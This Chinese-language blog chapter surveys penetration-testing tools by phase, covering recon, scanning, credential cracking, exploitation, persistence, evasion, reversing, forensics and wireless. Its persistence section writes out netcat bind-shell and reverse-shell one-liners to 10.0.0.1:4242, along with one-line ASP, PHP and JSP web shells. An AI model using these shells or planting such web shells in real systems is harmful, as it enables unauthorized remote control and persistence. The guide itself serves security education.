@@ -1,0 +1,557 @@
+> 渗透测试指南系列文章内容纲要：  
+> [第一章 渗透测试简介](column/238471.html)  
+> [第二章 前期交互](column/238471.html)  
+> [第三章 信息收集](column/238867.html)  
+> [第四章 漏洞识别](column/238867.html)  
+> [第五章 社会工程学](column/239520.html)  
+> [第六章 有线/无线网络利用](column/240371.html)  
+> 第七章 基于应用的漏洞利用  
+> 第八章 基于本地主机和物理的利用  
+> [第九章 后-利用 技术](articles/others-articles/243229.html)  
+>  **第十章 渗透测试工具集介绍**  
+> [第十一章 渗透报告](articles/others-articles/243229.html)
+
+本渗透测试工具集是我根据PenTest+ Cert Guide第九章的内容整理出来，另外根据我在实际渗透测试过程中的经验，补充一些工具。
+
+# 操作系统
+
+以下这些操作系统，区别于常规的系统如Linux，Windows，集成了非常多安全领域，特别是渗透测试领域常用的工具。对于安全工作者，渗透测试人员来说非常的友好。
+
+## kali
+
+Kali Linux 是基于Debian的Linux发行版，设计用于数字鉴识和渗透测试。由 Offensive Security Ltd
+维护和资助，官方地址: [Kali](https://www.kali.org/)。
+
+Kali安装镜像可分为ISO安装版，VMware版和VirtualBox版。另外还有Kali Linux
+NetHunter支持安装在手机上，相关安装教程，可看我这篇文章
+[安卓渗透测试平台Kali(Nethunter)搭建教程](articles/network/236710.html)
+
+渗透测试领域的认证，有一个举足轻重的认证OSCP就是和kali密切相关 OSCP PWK就是指Penetration With
+Kali。所以对于渗透测试人员来说，使用kali作为一个主要操作系统是非常明智的选择。
+
+kali收集了一个非常完备的工具集 <https://tools.kali.org/tools-listing>。在测试过程中如果没有思路，可以来看看里面的工具列表，说不定能提供一些额外的思路。
+
+## 其他操作系统
+
+[Parrot](https://parrotlinux.org/)  
+Parrot Security
+OS是一个基于Debian的Linux发行版，专注于计算机安全。它专为渗透测试，漏洞评估和缓解，计算机取证和匿名Web浏览而设计，由Frozenbox团队开发。
+
+[BlackArch Linux](https://blackarch.org/)  
+BlackArch Linux，简称BlackArch，是一份基于Arch的Linux发行版。该发行版被设计用于系统渗透测试及安全研究。
+
+[CAINE](https://www.caine-live.net/)  
+CAINE 是一个适用于数字取证的 live disc 发行版，基于
+Ubuntu。其提供了完整的取证环境，可将现有软件工具集成为软件模块，并提供友好的图形界面。
+
+[Security Onion](https://securityonion.net/)  
+Security Onion是一款专为入侵检测和NSM(网络安全监控)设计的Linux发行版。
+
+# 被动信息收集（Passive Reconnaissance）
+
+渗透测试工作者不与目标系统或目标公司的工作人员产生直接接触直接联系。而是通过第三方的渠道来获取目标公司的信息。这个信息收集的过程就称之为被动信息收集。
+
+讲到被动信息收集，就不得不提OSINT（Open-source intelligence）。公开来源情报（ En:Open-source
+intelligence 缩写为 OSINT）是从公开来源收集到的情报
+。在情报机构（IC）来看，“公开”是指公然展示的、公众可见的来源（相对于被掩盖或并非公开可见的来源）。
+
+## nslookup, host, dig
+
+域名和ip的查询，根据域名查ip或者根据ip查域名
+
+## whois
+
+whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。
+
+## FOCA
+
+FOCA主要是个检查和扫描文件的元数据及隐藏信息的信息收集工具。https://github.com/ElevenPaths/FOCA
+
+## exiftool
+
+ExifTool由Phil
+Harvey开发，是一款免费、跨平台的开源软件，用于读写和处理图像（主要）、音视频和PDF等文件的元数据（metadata）。特别是有些图片可能存储来GPS信息。
+
+## theharvester
+
+theHarvester是一款信息收集工具，它可以从不同的公开源中(例如：搜索引擎和PGP key服务器)收集E-mail账户信息，用户名称和主机名/子域名等。
+
+## shodan
+
+Shodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan
+搜索指定的设备，或者搜索特定类型的设备。
+
+## censys
+
+Censys是一款搜索引擎，它允许计算机科学家了解组成互联网的设备和网络。Censys由因特网范围扫描驱动，它使得研究人员能够找到特定的主机，并能够针将设备、网站和证书的配置和部署信息创建到一个总体报告中。https://censys.io/ipv4
+
+## maltego
+
+Maltego是一个交互式数据挖掘工具，它为链接分析呈现有向图。该工具用于在线调查，以发现互联网上各种来源的信息片段之间的关系。
+
+下载安装Maltego软件( https://www.maltego.com/downloads/
+)，注册一个帐户，把根节点拖入窗口，比如把infrastrature/domain拖到新窗口，输入example.com，右键开始“All
+Transforms”
+
+## recon-ng
+
+Recon-NG 是由Python 编写的一个开源的Web 侦查（资讯收集）框架，使用它可以自动的收集资讯和网路侦查。
+
+  * marketplace refresh刷新模块信息
+  * marketplace search搜索模块
+  * marketplace install 安装模块
+  * modules load 加载模块
+  * options list查看配置选项
+  * options set设置配置选项
+  * info查看配置信息是否正确
+  * run执行模块
+
+查看 [Recon-ng v5 Tutorial](https://geekwire.eu/recon-ng-v5-tutorial/) 了解更多。
+
+## sublist3r
+
+Sublist3r 是一个使用 OSINT 枚举网站子域的 Python 工具，它可以帮助渗透测试人员收集其目标域的子域。
+
+# 主动信息收集（Active Reconnaissance）
+
+主动侦察是一种计算机攻击类型，入侵者与目标系统进行接触，以收集有关漏洞的信息。
+
+一个简单的区分主动信息收集与被动信息收集的方法是
+收集信息的尝试是否有可能被目标系统感知到。如果目标系统无法感知到，则是被动信息收集，能感知到则为主动信息收集。
+
+## nmap and zenmap
+
+Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具。Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。
+
+    
+    
+    使用：
+    	目标指定
+    		scanme.nmap.org
+    		192.168.0.1
+    		172.20.172.3/24
+    		10.0-255.0-255.1-254
+    	主机发现
+    		-sP	使用ping扫描主机是否alive
+    		-P0 / -Pn	不使用ping扫描主机是否alive
+    	扫描技术
+    		-sS	SYN扫描
+    		-sT	TCP三次握手扫描
+    		-sA	ACK扫描
+    		-sF	FIN扫描
+    		-sU	UDP扫描
+    	端口指定
+    		-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080
+    		-F	Fast - Scan only the ports listed in the nmap-services file)
+    	服务检测
+    		-sV	Probe open ports to determine service/version info
+    		--version-all	Try every single probe for version detection
+    	系统检测
+    		-O	Enable OS detection
+    	时间性能
+    		-T[0-6]	Set timing template (higher is faster)
+    	输出文件
+    		-oX	output.xml	XML保存
+    		-oA	output		保存所有格式
+    		-v	Increase verbosity level (use twice for more effect)
+    	其他杂项
+    		-6	Enable IPv6 scanning
+      		-A	Enables OS detection and Version detection
+    
+
+nmap的参数很多，也不好记，我总结了一些经验  
+确定主机，涉及到“目标指定”，“主机发现”这两个模块，确定扫描的主机范围以及主机发现技术  
+确定端口服务，涉及到“端口指定”“扫描技术”“服务检测”三个模块，首先制定端口范围，其次确定端口扫描技术，再次确认服务扫描技术  
+杂项，比如 -O操作系统探测，-T时间（扫描速度），-v动态显示等  
+报告输出，指定输出的文件名以及格式
+
+## masscan
+
+这也是一个端口扫描器，相比于nmap，这个工具扫描速度非常快，可以和nmap配合起来使用，首先用masscan扫描一遍，再通过nmap确认以及服务扫描。
+
+## enum4linux
+
+enum4linux可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。
+
+## dirsearch
+
+dirsearch是一个简单的命令行工具，设计用来强制发现网站中的目录和文件。
+
+# 漏洞扫描（Vulnerability scanning）
+
+通过自动化或者半自动化工具对目标进行脆弱性扫描。扫描可分为系统扫描（比如OpenVAS，Nessus），Web应用扫描（Nikto，Burp
+Suite等）和服务扫描（SQLmap）
+
+漏洞扫描工具也可以分为自动化和半自动化，其中OpenVAS，Nessus等属于自动化，而Burp Suite，xray等属于半自动化
+
+## OpenVAS
+
+OpenVAS（Open Vulnerability Assessment
+System）是在nessus基础上发展起来的一个开源的漏洞扫描程序，其核心部件是一套漏洞测试程序，可以检测远程系统和应用程序中的安全问题。
+
+搭建和使用教程可参考下列文章  
+https://www.hackingtutorials.org/scanning-tutorials/vulnerability-scanning-openvas-9-pt-1/  
+https://www.hackingtutorials.org/scanning-tutorials/vulnerability-scanning-openvas-9-0-part-2/  
+https://www.hackingtutorials.org/scanning-tutorials/vulnerability-scanning-with-openvas-9-scanning-the-network/  
+https://www.hackingtutorials.org/scanning-tutorials/openvas-9-part-4-custom-scan-configurations/
+
+## Nessus
+
+Nessus号称是世界上最流行的漏洞扫描程序。Nessus 广受全球 30000
+余家企业信赖，成为部署范围最广泛的安全技术，也是漏洞评估行业的黄金标准。Nessus是商用软件，不过也有个人免费版本。
+
+参考文档  
+<https://docs.tenable.com/nessus/Content/InstallNessusEssentialsProfessionalOrManager.htm>  
+<https://www.tenable.com/blog/how-to-run-your-first-vulnerability-scan-with-nessus>
+
+## Nikto
+
+Nikto是一个开放源代码（GPL）Web服务器扫描程序，它针对多个项目对Web服务器执行全面测试，包括6700多个潜在危险的文件/程序，检查1250多个服务器的过时版本以及270多个服务器上的特定于版本的问题。
+它还会检查服务器配置项，例如是否存在多个索引文件，HTTP服务器选项，并将尝试识别已安装的Web服务器和软件。 扫描项目和插件会经常更新，并且可以自动更新。
+
+安装及使用  
+git clone https://github.com/sullo/nikto.git  
+cd nikto/program  
+perl nikto.pl -h http://www.example.com
+
+参考文档 <https://cirt.net/nikto2-docs/index.html>
+
+## Burp Suite
+
+Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp
+Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。
+
+Burpsuit有收费的pro版本和免费的社区版本。社区版本下载地址：<https://portswigger.net/burp/communitydownload>
+
+使用教程：<https://t0data.gitbooks.io/burpsuite/content/>  
+另外，在Burp Suite的Help–Burp Suite Documentation中有详尽的说明材料
+
+## OWASP Zed Attack Proxy
+
+OWASP Zed attack proxy 是一款 web application
+集成渗透测试和漏洞工具，是免费开源跨平台的。支持截断代理，主动、被动扫描，Fuzzy，暴力破解并且提供 API。
+
+下载安装<https://www.zaproxy.org/download/>, 使用教程
+<https://www.zaproxy.org/getting-started/>
+
+## xray
+
+xray (https://github.com/chaitin/xray)
+是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows
+/ macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。
+
+工具使用指南 <https://docs.xray.cool/#/tutorial/introduce>
+
+## SQLmap
+
+sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL
+注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。
+
+下载https://github.com/sqlmapproject/sqlmap/zipball/master，
+解压到本地，进入解压目录，执行python sqlmap.py 其他参数查看下方使用教程
+
+    
+    
+    使用教程：
+    	Target
+    		-u URL
+    		-r RequestFILE
+    	Request
+    		--method=METHOD
+    		--data=DATA
+    		--cookie=COOKIE
+    		--headers=HEADERS
+    		--proxy=PROXY
+    	Optimization:
+    		-o                  Turn on all optimization switches
+    		--threads=THREADS   Max number of threads
+    	Injection:
+    		--dbms=DBMS
+    	Detection:
+    		--level=LEVEL
+    		--risk=RISK
+    		--code=CODE         HTTP code to match when query is evaluated to True
+    		--regexp=REGEXP     Regexp to match when query is evaluated to True
+    	Techniques:
+    		--technique=TECH    TECH=BEUSTQ
+    	Enumeration:
+    		-a, --all           Retrieve everything
+        	-b, --banner        Retrieve DBMS banner
+    		--dump              Dump DBMS database table entries
+        	--dump-all          Dump all DBMS databases tables entries
+    		--sql-shell         Prompt for an interactive SQL shell
+    	File system access:
+    		--file-read=FILE..  Read a file from the back-end DBMS file system
+    		--file-write=FIL..  Write a local file on the back-end DBMS file system
+    		--file-dest=FILE..  Back-end DBMS absolute filepath to write to
+    	Operating system access:
+    		--os-cmd=OSCMD      Execute an operating system command
+    		--os-shell          Prompt for an interactive operating system shell
+    	Miscellaneous:
+    		-v VERBOSE          Verbosity level: 0-6 (default 1)
+    
+
+## 其他漏洞扫描工具
+
+工具还是非常多的，找到一款自己用的顺手的，如果有开源再进行适配定制，就再好不过了。下面这些工具我没怎么使用，就不展开介绍了。
+
+Nexpose， Qualys， W3AF， SPARTA
+
+# 凭证攻击（Credential attacks）
+
+基于凭证的攻击发生在攻击者窃取凭证以获得访问权、绕过组织的安全措施并窃取关键数据时。大多数时候凭证都不是明文保持的，就需要暴破，无论是通过字典还是彩虹表等暴破出密码。
+
+## John the Ripper
+
+John the Ripper (“JtR”)
+是一个非常有用的工具。这是一个快速的密码破解器，适用于Windows和许多Linux系统。它具有很多功能，对于很多密码破解均有奇效。该工具提供命令行模式以及GUI模式，分别是john和Johnny
+。kali自带了这两个工具。
+
+    
+    
+    使用简介：
+    	john /etc/shadow
+    	john --wordlist=word.list /etc/shadow
+    	https://tools.kali.org/password-attacks/johnny
+    
+
+## Hydra
+
+Hydra是一个并行的登录破解程序，支持多种协议的攻击。它非常快速和灵活，新模块很容易添加。kali默认集成了该工具
+
+使用： hydra -l user -P passlist.txt ftp://192.168.0.1
+
+## Hashcat
+
+hashcat是世界上最快和最先进的密码恢复工具，支持超过200个高度优化的哈希算法的五种独特的攻击模式。hashcat目前支持Linux、Windows和OSX上的cpu、gpu和其他硬件加速器，并具有帮助启用分布式密码破解的功能。
+
+使用： hashcat -a 3 0192023a7bbd73250516f069df18b*500 –force ?l?l?l?l?l?d?d?d
+
+(把上述*号删除)
+
+## Ncrack
+
+Ncrack是一种高速网络认证破解工具。它旨在通过主动测试所有主机和网络设备的糟糕密码，帮助企业保护网络安全. kali集成了该工具。
+
+使用： ncrack -p ssh:2222 –user victim -P passes.txt 192.168.1.2
+
+## 其他凭证攻击工具
+
+Cain and Abel，rcrack， Medusa， CeWL， W3AF， Mimikatz， Patator
+
+# 利用（Exploitation）
+
+## Metasploit
+
+Metasploit的设计初衷是打造成一个攻击工具开发平台,
+它是少数几个可用于执行诸多渗透测试步骤的工具。攻击者可以将来自漏洞扫描程序的结果导入到Metasploit框架的开源安全工具Armitage中，然后通过Metasploit的模块来确定漏洞。一旦发现了漏洞，攻击者就可以采取一种可行方法攻击系统，通过Shell或启动Metasploit的meterpreter来控制这个系统。
+
+使用手册：<https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit>
+
+## BeEF
+
+BeEF是浏览器开发框架(Browser Exploitation
+Framework)的缩写。它是一个专注于web浏览器的渗透测试工具。在对客户端(包括移动客户端)遭受网络攻击的日益关注中，BeEF允许专业渗透测试人员通过使用客户端攻击向量来评估目标环境的实际安全态势。
+
+使用手册：<https://github.com/beefproject/beef/wiki/Introducing-BeEF>
+
+# 维持（Persistence）
+
+维持在PTES中属于后渗透阶段，在渗透进目标系统后，一方面提权到最高权限，另一方面就是维持最高权限的访问。可以通过添加帐户，通过开启一个网络服务监听连接，可以反弹shell等。
+
+## bind shell
+
+nc -lvp 4242 -e /bin/bash
+
+## reverse shell
+
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1  
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1  
+ncat 10.0.0.1 4242 -e /bin/bash  
+ncat –udp 10.0.0.1 4242 -e /bin/bash
+
+## asp一句话木马
+
+    
+    
+    <%eVAl reQuEst("asp")%><br>
+    <%exECuTe ReqUEst("asp")%><br>
+    <%eXECutegLobaL rEquEst("asp")%>
+    
+
+## php一句话木马
+
+    
+    
+    <?php @eval($_POST['php']);?>
+    
+
+## jsp一句话木马
+
+    
+    
+    <%Runtime.getRuntime().exec(request.getParameter("jsp"));%>
+    
+
+## WebShell 管理工具
+
+常用的有 中国菜刀，蚁剑，冰蝎
+
+## 其他维持工具
+
+RDP， Apple Remote Desktop， VNC， X server forwarding， PowerSploit， Empire
+
+# 规避（Evasion）
+
+前面提到脆弱性扫描，发现脆弱性后利用，渗透进入系统之后维持访问以及权限，接下来要做的一方面是隐藏流量，让入侵不容易被发现，另一方面要绕过各种安全控制比如IDS，anti
+virus等
+
+## proxychains
+
+ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4,
+SOCKS5 或HTTP(S)
+代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。
+
+使用：配置好/etc/proxychains.conf， 然后命令行执行 #proxychains4 命令（比如 wget
+http://google.com/）
+
+## Proxifier
+
+Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。
+
+工具下载地址：<https://www.onlinedown.net/soft/971579.htm>
+
+## 其他规避工具
+
+Veil， Tor， Encryption， Encapsulation and tunneling using DNS and protocols
+such as NTP
+
+DNS Tunneling
+
+  * DeNiSe
+  * dns2tcp
+  * DNScapy
+  * DNScat
+  * DNScat2
+  * Heyoka
+  * Iodine
+  * OzymanDNS and sods
+  * psudp
+  * feederbot and Moto
+
+# 调试和反编译（Debugging and Decompilation）
+
+## IDA Pro
+
+IDA Pro（Interactive Disassembler
+Professional）是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器！IDA
+Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或Linux WinCE MacOS平台主机来分析程序，
+被公认为是逆向工程利器。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。它支持数十种CPU指令集其中包括Intel
+x86，x64，MIPS，PowerPC，ARM，Z80，68000，c8051等等。
+
+使用技巧教程：<https://xz.aliyun.com/t/4205>
+
+更多官方资料：<https://www.hex-rays.com/products/ida/support/>
+
+## Ghidra
+
+在2019年3月份举办的RSA大会上，NSA发布了一款功能强大、免费的开源逆向分析工具：Ghidra。该反汇编工具类似于我们常用的IDA，不过其基于JAVA开发，是一款适用于Windows、Mac和Linux的跨平台反汇编工具，用户还可以使用Java或Python开发自己的Ghidra插件或者脚本。
+
+安装及使用教程：<https://www.secrss.com/articles/8829>
+
+快捷键参考：<https://www.ghidra-sre.org/CheatSheet.html>  
+比如Decompiler Ctrl+E， 类似于IDA 里F5的功能，把汇编反编译为C语言
+
+官方Github发布地址：https://github.com/NationalSecurityAgency/ghidra
+
+## GDB
+
+GDB（GNU symbolic
+debugger）简单地说就是一个调试工具。它是一个受通用公共许可证即GPL保护的自由软件。像所有的调试器一样，GDB可以让你调试一个程序，包括让程序在你希望的地方停下，此时你可以查看变量、寄存器、内存及堆栈。更进一步你可以修改变量及内存值。GDB是一个功能很强大的调试器，它可以调试多种语言。
+
+以下是gdb的内存打印参数，更多cheatsheet可参考
+<https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf>
+
+    
+    
+    x/nfu <address>
+    Print memory.
+        n: How many units to print (default 1).
+        f: Format character (like „print“).
+            a: Pointer.
+            c: Read as integer, print as character.
+            d: Integer, signed decimal.
+            f: Floating point number.
+            o: Integer, print as octal.
+            s: Try to treat as C string.
+            t: Integer, print as binary (t = „two“).
+            u: Integer, unsigned decimal.
+            x: Integer, print as hexadecimal.
+        u: Unit.Unit is one of:
+            b: Byte,
+            h: Half-word (two bytes)
+            w: Word (four bytes)
+            g: Giant word (eight bytes))
+    
+
+## 其他调试和反编译工具
+
+WinDbg, OllyDbg, edb Debugger, Immunity Debugger, Objdump
+
+# 取证（Forensics）
+
+>
+> 计算机取证(也称为计算机取证科学)是数字取证科学的一个分支，涉及计算机和数字存储媒体中证据的发现。计算机取证的目标是以一种取证的方式检查数字媒体，目的是识别、保存、恢复、分析和呈现有关数字信息的事实和观点。虽然它通常与各种各样的计算机犯罪的调查有关，计算机取证也可以在民事诉讼中使用。
+
+和取证有关的工具如下，这些工具笔者也不怎么接触，所以就不展开了。
+
+  * ADIA
+  * CAINE
+  * Skadi
+  * DEFT
+  * PALADIN
+  * Security Onion
+  * SIFT Workstation
+
+# 软件保证（Software assurance）
+
+所谓软件保证是指对软件和协议进行鲁棒性测试，包括Fuzz测试以及代码分析。
+
+## 代码分析工具
+
+  * Findbugs
+  * Findsecbugs
+  * SonarQube
+
+## Fuzzing工具
+
+  * Peach
+  * Mutiny Fuzzing Framework
+  * American Fuzzy Lop
+  * Codenomicon defensis
+  * radamsa
+
+关于Peach Fuzz工具，这里有一份非常全面的资料，供读者参考 <https://github.com/TideSec/Peach_Fuzzing>
+
+# 无线工具（Wireless Tools）
+
+无线（Wi-Fi，蓝牙，NFC等）相关的工具
+
+  * Kismet
+  * KisMAC
+  * aircrack-ng
+  * airmon-ng
+  * airodump-ng
+  * aireplay-ng
+  * WiGLE
+  * Reaver
+  * packetforge-ng
+  * ettercap
+  * bluesnarfer
+  * proxmark3
+
+工具随着时间的推移会做适当调整，所以我把本文维护在 <https://github.com/kafroc/PenTest_Tools>
+欢迎大家Star关注，我会持续更新维护渗透测试工具列表。
+
+**由于笔者水平有限，文章难免会有错误的，欢迎读者批评指正。笔者个人邮箱：kafrocyang@gmail.com**
+
